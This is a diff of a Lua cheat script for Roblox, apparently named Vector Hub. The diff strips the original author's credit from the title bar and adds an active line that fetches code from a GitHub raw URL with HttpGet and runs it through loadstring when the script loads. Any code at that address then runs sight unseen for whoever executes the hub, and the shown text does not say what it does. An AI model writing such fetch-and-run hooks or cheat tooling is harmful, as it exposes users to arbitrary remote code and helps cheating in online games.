@@ -767,7 +767,7 @@ end
 		Title2.Position = UDim2.new(0, 95, 0, 10)
 		Title2.Size = UDim2.new(0, 483, 0, 31)
 		Title2.Font = Enum.Font.FredokaOne
-		Title2.Text = "Hub | By Ryuenz#6264 |Beta Version"
+		Title2.Text = "Hub | Version 1.0"
 		Title2.TextColor3 = _G.Color
 		Title2.TextSize = 17.000
 		Title2.TextWrapped = true
@@ -12446,7 +12446,7 @@ spawn(function()
 end)
 FakeDamage("Vector Hub")
 Vec("<Color=Green>Vector Hub loaded successfully<Color=/>")
-	--Vec("<Color=Yellow>:ENG:\n:If the gui doesn't load, use Fluxus in the Executor room:\n:TH:\n:ถ้าหน้าต่างโปรไม่โหลดให้ใช้ Fluxus ที่ผมแจกในห้อง Executor:<Color=/>")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hmmm213/1/main/Noti"))()
 else
 	game.Players.LocalPlayer:Kick("..")
 end
